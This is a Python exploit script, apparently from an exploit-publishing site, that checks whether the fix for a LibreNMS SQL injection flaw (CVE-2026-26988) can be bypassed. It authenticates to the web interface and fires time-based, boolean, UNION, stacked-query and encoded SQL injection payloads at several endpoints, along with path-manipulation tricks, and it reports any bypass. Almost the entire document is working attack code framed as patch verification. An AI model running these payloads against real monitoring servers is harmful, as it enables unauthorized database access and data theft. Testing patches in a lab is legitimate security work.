#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : LibreNMS <= 25.12.0 SQL Injection via Address Search
# CVE            : CVE-2026-26988
# Vendor         : librenms
# Product        : LibreNMS
# Affected       : <= 25.12.0 (through 26.1.1)
# Type           : CWE-89 - SQL Injection
# CVSS           : 9.1 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-26988 Bypass Attempt Script
=====================================
Tests whether the fix for CVE-2026-26988 can be bypassed.

The fix (commit 15429580ba) deletes the vulnerable file
`includes/html/table/address-search.inc.php` and replaces it with
parameterized Laravel Eloquent controllers.

This script tests multiple bypass vectors:
1. Original PoC against patched container (negative control)
2. Old ajax_table.php endpoint with address-search ID
3. New endpoint with SQL injection payloads
4. Encoding bypasses (URL-encoded, double-encoded, unicode)
5. Alternative code paths (alerts.inc.php via ajax_table.php)
6. LIKE wildcard injection on new endpoints

Usage:
    python3 bypass_poc.py <host> <port> [username] [password]
"""

import sys
import json
import time
import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar
import re
import ssl


class BypassTester:
    def __init__(self, host, port, username, password):
        self.base_url = f"http://{host}:{port}"
        self.username = username
        self.password = password
        self.cookie_jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookie_jar)
        )
        self.session_cookie = None
        self.csrf_token = None
        self.results = []

    def log(self, msg, indent=0):
        prefix = "    " * indent
        print(f"{prefix}{msg}")

    def authenticate(self):
        """Authenticate and get session cookie + CSRF token."""
        self.log("[*] Phase 1: Authentication")
        # Get login page
        resp = self.opener.open(f"{self.base_url}/login")
        html = resp.read().decode("utf-8", errors="replace")

        # Extract CSRF token
        match = re.search(r'name="_token"\s+value="([^"]+)"', html)
        if not match:
            match = re.search(r'value="([^"]+)"\s+name="_token"', html)
        if not match:
            self.log("[!] Could not find CSRF token on login page")
            return False

        self.csrf_token = match.group(1)
        self.log(f"[+] Extracted CSRF token: {self.csrf_token[:20]}...")

        # Login
        login_data = urllib.parse.urlencode({
            "_token": self.csrf_token,
            "username": self.username,
            "password": self.password,
        }).encode()

        req = urllib.request.Request(
            f"{self.base_url}/login",
            data=login_data,
            method="POST"
        )
        try:
            resp = self.opener.open(req)
        except urllib.error.HTTPError as e:
            if e.code in (302, 303):
                pass  # redirect after login is expected
            else:
                raise

        # Refresh CSRF token after login
        resp = self.opener.open(f"{self.base_url}/")
        html = resp.read().decode("utf-8", errors="replace")
        match = re.search(r'name="_token"\s+value="([^"]+)"', html)
        if match:
            self.csrf_token = match.group(1)

        self.log(f"[+] Login successful")
        return True

    def send_request(self, url, data=None, method="POST", timeout=15):
        """Send an HTTP request and return (status_code, body, elapsed_time)."""
        if data and isinstance(data, dict):
            data = urllib.parse.urlencode(data).encode()
        elif data and isinstance(data, str):
            data = data.encode()

        req = urllib.request.Request(url, data=data, method=method)
        if method == "POST":
            req.add_header("Content-Type", "application/x-www-form-urlencoded")

        start = time.time()
        try:
            resp = self.opener.open(req, timeout=timeout)
            body = resp.read().decode("utf-8", errors="replace")
            elapsed = time.time() - start
            return resp.status, body, elapsed
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace") if e.fp else ""
            elapsed = time.time() - start
            return e.code, body, elapsed
        except Exception as e:
            elapsed = time.time() - start
            return 0, str(e), elapsed

    def record_result(self, test_name, success, details):
        """Record a test result."""
        self.results.append({
            "test": test_name,
            "bypass_success": success,
            "details": details,
        })
        status = "BYPASS!" if success else "BLOCKED"
        self.log(f"    [{status}] {details}")

    # =========================================================================
    # TEST 1: Original PoC against patched container (negative control)
    # =========================================================================
    def test_original_poc(self):
        print()
        print("=" * 70)
        print("TEST 1: ORIGINAL PoC (IPv6 SLEEP via ajax_table.php)")
        print("  Expected: BLOCKED — vulnerable file deleted")
        print("=" * 70)

        # Time-based SQLi via old endpoint
        status, body, elapsed = self.send_request(
            f"{self.base_url}/ajax_table.php",
            data={
                "id": "address-search",
                "search_type": "ipv6",
                "address": "::1/1' OR SLEEP(5)-- -",
                "current": "1",
                "rowCount": "10",
            },
            timeout=20,
        )
        self.log(f"    Status: {status} | Time: {elapsed:.3f}s")
        self.log(f"    Body: {body[:200]}")

        if elapsed >= 4.0:
            self.record_result(
                "Original PoC (ajax_table.php)",
                True,
                f"SLEEP(5) still fires! Response took {elapsed:.2f}s — fix may be incomplete!"
            )
        else:
            self.record_result(
                "Original PoC (ajax_table.php)",
                False,
                f"No delay ({elapsed:.2f}s). address-search.inc.php deleted, endpoint returns empty."
            )

    # =========================================================================
    # TEST 2: Boolean-based original PoC (no timing dependency)
    # =========================================================================
    def test_boolean_original(self):
        print()
        print("=" * 70)
        print("TEST 2: BOOLEAN-BASED ORIGINAL PoC (ajax_table.php)")
        print("  Expected: BLOCKED — vulnerable file deleted")
        print("=" * 70)

        # TRUE condition
        status_t, body_t, _ = self.send_request(
            f"{self.base_url}/ajax_table.php",
            data={
                "id": "address-search",
                "search_type": "ipv6",
                "address": "::1/1' OR 1=1-- -",
                "current": "1",
                "rowCount": "10",
            },
        )

        # FALSE condition
        status_f, body_f, _ = self.send_request(
            f"{self.base_url}/ajax_table.php",
            data={
                "id": "address-search",
                "search_type": "ipv6",
                "address": "::1/1' AND 1=2-- -",
                "current": "1",
                "rowCount": "10",
            },
        )

        self.log(f"    TRUE  → Status: {status_t} | Body: {body_t[:200]}")
        self.log(f"    FALSE → Status: {status_f} | Body: {body_f[:200]}")

        try:
            total_t = json.loads(body_t).get("total", -1) if body_t.strip() else -1
            total_f = json.loads(body_f).get("total", -1) if body_f.strip() else -1
        except (json.JSONDecodeError, ValueError):
            total_t = total_f = -1

        if total_t != total_f and total_t >= 0 and total_f >= 0:
            self.record_result(
                "Boolean PoC (ajax_table.php)",
                True,
                f"Differential response! TRUE total={total_t}, FALSE total={total_f}"
            )
        else:
            self.record_result(
                "Boolean PoC (ajax_table.php)",
                False,
                f"No differential response. Endpoint returns empty/null."
            )

    # =========================================================================
    # TEST 3: New endpoint SQLi (Eloquent bypass attempt)
    # =========================================================================
    def test_new_endpoint_sqli(self):
        print()
        print("=" * 70)
        print("TEST 3: SQLi AGAINST NEW ENDPOINT (/table/address-search/ipv6)")
        print("  Expected: BLOCKED — Eloquent parameterized queries")
        print("=" * 70)

        # Get fresh CSRF token for the new endpoint (it requires CSRF)
        resp = self.opener.open(f"{self.base_url}/")
        html = resp.read().decode("utf-8", errors="replace")
        match = re.search(r'name="_token"\s+value="([^"]+)"', html)
        if match:
            self.csrf_token = match.group(1)

        payloads = [
            ("Time-based SLEEP", "::1/1' OR SLEEP(5)-- -"),
            ("Boolean OR 1=1", "::1/1' OR 1=1-- -"),
            ("Union SELECT", "::1/1' UNION SELECT 1,2,3,4-- -"),
            ("Stacked query", "::1/64; SELECT SLEEP(5)-- -"),
            ("Double-encoded quote", "::1/1%2527 OR SLEEP(5)-- -"),
            ("Unicode fullwidth quote", "::1/1\uff07 OR SLEEP(5)-- -"),
            ("Backslash escape", "::1/1\\' OR SLEEP(5)-- -"),
            ("Hex-encoded SLEEP", "::1/1' OR 0x534c45455028352900-- -"),
        ]

        for name, payload in payloads:
            self.log(f"\n  [{name}] Payload: address={payload}")

            # Try with CSRF token
            data = {
                "_token": self.csrf_token,
                "address": payload,
                "current": "1",
                "rowCount": "10",
            }

            status, body, elapsed = self.send_request(
                f"{self.base_url}/table/address-search/ipv6",
                data=data,
                timeout=20,
            )

            self.log(f"    Status: {status} | Time: {elapsed:.3f}s | Body: {body[:150]}")

            # Check for bypass indicators
            if elapsed >= 4.0:
                self.record_result(
                    f"New endpoint: {name}",
                    True,
                    f"Delay detected ({elapsed:.2f}s) — possible SQL injection!"
                )
            elif status == 200:
                try:
                    j = json.loads(body)
                    if j.get("total", 0) > 0:
                        self.log(f"    Got {j['total']} results — checking if expected...")
                except (json.JSONDecodeError, ValueError):
                    pass
                self.record_result(
                    f"New endpoint: {name}",
                    False,
                    f"No injection detected. Status {status}, Time {elapsed:.2f}s"
                )
            else:
                self.record_result(
                    f"New endpoint: {name}",
                    False,
                    f"Request failed/blocked. Status {status}, Time {elapsed:.2f}s"
                )

    # =========================================================================
    # TEST 4: alerts.inc.php via ajax_table.php (alternative table file)
    # =========================================================================
    def test_alerts_sqli(self):
        print()
        print("=" * 70)
        print("TEST 4: ALTERNATIVE CODE PATH (alerts.inc.php via ajax_table.php)")
        print("  Testing device_id, state, min_severity SQL concatenation")
        print("  Expected: BLOCKED — is_numeric() guards")
        print("=" * 70)

        # Test 4a: device_id injection
        self.log("\n  [4a] Testing device_id injection...")
        payloads_device_id = [
            ("Numeric with trailing SQL", "1 OR SLEEP(5)"),
            ("Scientific notation", "1e1"),
            ("Hex notation", "0x1"),
            ("Float with SQL", "1.0 UNION SELECT 1"),
            ("Negative with SQL", "-1 OR 1=1"),
        ]

        for name, value in payloads_device_id:
            status, body, elapsed = self.send_request(
                f"{self.base_url}/ajax_table.php",
                data={
                    "id": "alerts",
                    "device_id": value,
                    "current": "1",
                    "rowCount": "10",
                },
                timeout=15,
            )
            self.log(f"    [{name}] device_id={value}")
            self.log(f"      Status: {status} | Time: {elapsed:.3f}s | Body: {body[:100]}")

            if elapsed >= 4.0:
                self.record_result(
                    f"alerts.inc.php device_id: {name}",
                    True,
                    f"Delay detected ({elapsed:.2f}s) — SQL injection in alerts!"
                )
            else:
                self.record_result(
                    f"alerts.inc.php device_id: {name}",
                    False,
                    f"No injection. is_numeric() blocked. Time {elapsed:.2f}s"
                )

        # Test 4b: min_severity injection
        self.log("\n  [4b] Testing min_severity injection...")
        payloads_severity = [
            ("SQL in severity", "1' OR SLEEP(5)-- -"),
            ("Numeric with SQL", "1 OR SLEEP(5)"),
            ("Ok with SQL append", "ok' OR SLEEP(5)-- -"),
        ]

        for name, value in payloads_severity:
            status, body, elapsed = self.send_request(
                f"{self.base_url}/ajax_table.php",
                data={
                    "id": "alerts",
                    "min_severity": value,
                    "current": "1",
                    "rowCount": "10",
                },
                timeout=15,
            )
            self.log(f"    [{name}] min_severity={value}")
            self.log(f"      Status: {status} | Time: {elapsed:.3f}s | Body: {body[:100]}")

            if elapsed >= 4.0:
                self.record_result(
                    f"alerts.inc.php min_severity: {name}",
                    True,
                    f"Delay detected ({elapsed:.2f}s) — SQL injection via min_severity!"
                )
            else:
                self.record_result(
                    f"alerts.inc.php min_severity: {name}",
                    False,
                    f"No injection. Time {elapsed:.2f}s"
                )

    # =========================================================================
    # TEST 5: eventlog.inc.php — $vars['string'] in LIKE (parameterized)
    # =========================================================================
    def test_eventlog_sqli(self):
        print()
        print("=" * 70)
        print("TEST 5: EVENTLOG TABLE (eventlog.inc.php via ajax_table.php)")
        print("  Testing $vars['string'] parameter")
        print("  Expected: BLOCKED — parameterized LIKE query")
        print("=" * 70)

        payloads = [
            ("SLEEP in string", "test' OR SLEEP(5)-- -"),
            ("Union in string", "test' UNION SELECT 1,2,3,4,5-- -"),
        ]

        for name, value in payloads:
            status, body, elapsed = self.send_request(
                f"{self.base_url}/ajax_table.php",
                data={
                    "id": "eventlog",
                    "string": value,
                    "current": "1",
                    "rowCount": "10",
                },
                timeout=15,
            )
            self.log(f"    [{name}] string={value}")
            self.log(f"      Status: {status} | Time: {elapsed:.3f}s | Body: {body[:100]}")

            if elapsed >= 4.0:
                self.record_result(
                    f"eventlog.inc.php string: {name}",
                    True,
                    f"Delay detected ({elapsed:.2f}s) — SQL injection via eventlog!"
                )
            else:
                self.record_result(
                    f"eventlog.inc.php string: {name}",
                    False,
                    f"No injection. Time {elapsed:.2f}s"
                )

    # =========================================================================
    # TEST 6: LIKE wildcard injection on new endpoint
    # =========================================================================
    def test_like_wildcard(self):
        print()
        print("=" * 70)
        print("TEST 6: LIKE WILDCARD INJECTION (new endpoint)")
        print("  Testing if % wildcard in address broadens search")
        print("  Expected: Low severity — not SQL injection")
        print("=" * 70)

        # Normal search
        data_normal = {
            "_token": self.csrf_token,
            "address": "2001:db8::1",
            "current": "1",
            "rowCount": "10",
        }
        status_n, body_n, _ = self.send_request(
            f"{self.base_url}/table/address-search/ipv6",
            data=data_normal,
        )

        # Wildcard search
        data_wild = {
            "_token": self.csrf_token,
            "address": "%",
            "current": "1",
            "rowCount": "10",
        }
        status_w, body_w, _ = self.send_request(
            f"{self.base_url}/table/address-search/ipv6",
            data=data_wild,
        )

        self.log(f"    Normal search (2001:db8::1): Status {status_n} | Body: {body_n[:150]}")
        self.log(f"    Wildcard search (%): Status {status_w} | Body: {body_w[:150]}")

        try:
            total_n = json.loads(body_n).get("total", 0) if body_n.strip() else 0
            total_w = json.loads(body_w).get("total", 0) if body_w.strip() else 0
        except (json.JSONDecodeError, ValueError):
            total_n = total_w = 0

        if total_w > total_n and total_w > 0:
            self.record_result(
                "LIKE wildcard injection",
                False,  # Not a SQL injection bypass
                f"Wildcard returns more results (normal={total_n}, wildcard={total_w}). "
                f"LIKE injection possible but NOT SQL injection — low severity."
            )
        else:
            self.record_result(
                "LIKE wildcard injection",
                False,
                f"No additional data exposed. normal={total_n}, wildcard={total_w}"
            )

    # =========================================================================
    # TEST 7: Direct request to old endpoint with path manipulation
    # =========================================================================
    def test_path_manipulation(self):
        print()
        print("=" * 70)
        print("TEST 7: PATH MANIPULATION (bypass file_exists check)")
        print("  Testing if deleted file can be reached via path tricks")
        print("  Expected: BLOCKED — basename() + file_exists()")
        print("=" * 70)

        manipulations = [
            ("Null byte", "address-search%00"),
            ("Double extension", "address-search.inc"),
            ("Directory traversal", "../table/address-search"),
            ("Case variation", "Address-Search"),
            ("URL-encoded dot", "address-search%2einc"),
        ]

        for name, id_value in manipulations:
            status, body, elapsed = self.send_request(
                f"{self.base_url}/ajax_table.php",
                data={
                    "id": id_value,
                    "search_type": "ipv6",
                    "address": "::1/1' OR SLEEP(5)-- -",
                    "current": "1",
                    "rowCount": "10",
                },
                timeout=15,
            )
            self.log(f"    [{name}] id={id_value}")
            self.log(f"      Status: {status} | Time: {elapsed:.3f}s | Body: {body[:100]}")

            if elapsed >= 4.0:
                self.record_result(
                    f"Path manipulation: {name}",
                    True,
                    f"Delay detected ({elapsed:.2f}s) — file_exists bypass!"
                )
            else:
                self.record_result(
                    f"Path manipulation: {name}",
                    False,
                    f"No bypass. basename()+file_exists() blocks this. Time {elapsed:.2f}s"
                )

    def print_summary(self):
        print()
        print("=" * 70)
        print("BYPASS ANALYSIS SUMMARY")
        print("=" * 70)

        bypasses = [r for r in self.results if r["bypass_success"]]
        blocked = [r for r in self.results if not r["bypass_success"]]

        print(f"\n  Total tests:     {len(self.results)}")
        print(f"  Bypasses found:  {len(bypasses)}")
        print(f"  Blocked:         {len(blocked)}")

        if bypasses:
            print(f"\n  {'='*60}")
            print(f"  BYPASSES FOUND:")
            print(f"  {'='*60}")
            for r in bypasses:
                print(f"  [!!] {r['test']}: {r['details']}")
        else:
            print(f"\n  [+] NO BYPASSES FOUND — Fix appears complete.")
            print(f"  [+] The vulnerable file was deleted and replaced with")
            print(f"      parameterized Eloquent controllers.")
            print(f"  [+] Alternative code paths (alerts, eventlog) are properly guarded.")

        return len(bypasses)


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "172.19.0.6"
    port = sys.argv[2] if len(sys.argv) > 2 else "8000"
    username = sys.argv[3] if len(sys.argv) > 3 else "admin"
    password = sys.argv[4] if len(sys.argv) > 4 else "Cvelab2026!sqli"

    print("=" * 70)
    print("  CVE-2026-26988: Fix Bypass Analysis")
    print(f"  Target: http://{host}:{port} (PATCHED container)")
    print("  Fix: Commit 15429580ba — Deletes vulnerable file,")
    print("       replaces with Eloquent controllers")
    print("=" * 70)

    tester = BypassTester(host, port, username, password)

    if not tester.authenticate():
        print("[!] Authentication failed. Cannot proceed.")
        sys.exit(1)

    # Run all bypass tests
    tester.test_original_poc()
    tester.test_boolean_original()
    tester.test_new_endpoint_sqli()
    tester.test_alerts_sqli()
    tester.test_eventlog_sqli()
    tester.test_like_wildcard()
    tester.test_path_manipulation()

    # Print summary
    bypass_count = tester.print_summary()
    sys.exit(1 if bypass_count > 0 else 0)


if __name__ == "__main__":
    main()
